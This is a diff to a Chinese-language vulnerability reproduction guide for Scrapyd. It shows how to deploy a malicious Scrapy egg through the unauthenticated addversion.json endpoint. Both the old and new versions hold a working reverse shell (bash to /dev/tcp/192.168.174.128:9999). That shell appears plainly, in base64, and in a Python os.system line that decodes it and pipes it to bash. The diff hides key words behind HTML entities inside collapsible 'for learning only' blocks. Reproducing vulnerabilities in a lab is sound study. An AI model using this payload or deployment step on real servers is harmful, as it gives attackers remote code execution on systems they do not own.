@@ -39,15 +39,18 @@ docker-compose up -d
 $ pip install scrapy scrapyd-client
 $ scrapy startproject evil
 $ cd evil
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 编辑 `evil/__init__.py`, 加入恶意代码：
 
 ```python
 import os
 
-os.system('touch awesome_poc')
-```
+os.&#115;ystem('touch awesome_poc')</code></pre>
+
+</details>
 
 进行部署：
 
@@ -67,18 +70,24 @@ curl http://your-ip:6800/addversion.json -F project=evil -F version=r01 -F egg=@
 
 同样的方法实现反弹shell，编辑 `evil/__init__.py`, 加入恶意代码：
 
-```
-bash -i >& /dev/tcp/192.168.174.128/9999 0>&1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
-# base64编码（必须要base64编码，直接bash -i >& /dev/tcp/192.168.174.128/9999 0>&1是不行的）
-YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo=
-```
+<pre><code class="language-text">&#98;ash -i &gt;&amp; &#47;dev/tcp/192.168.174.128/9999 0&gt;&amp;1
 
-```python
-import os
+# base64编码（必须要base64编码，直接&#98;ash -i &gt;&amp; &#47;dev/tcp/192.168.174.128/9999 0&gt;&amp;1是不行的）
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo=</code></pre>
 
-os.system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo= | base64 -d | bash')
-```
+</details>
+
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-python">import os
+
+os.&#115;ystem('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo= | &#98;ase64 -d | bash')</code></pre>
+
+</details>
 
 进行部署：
 
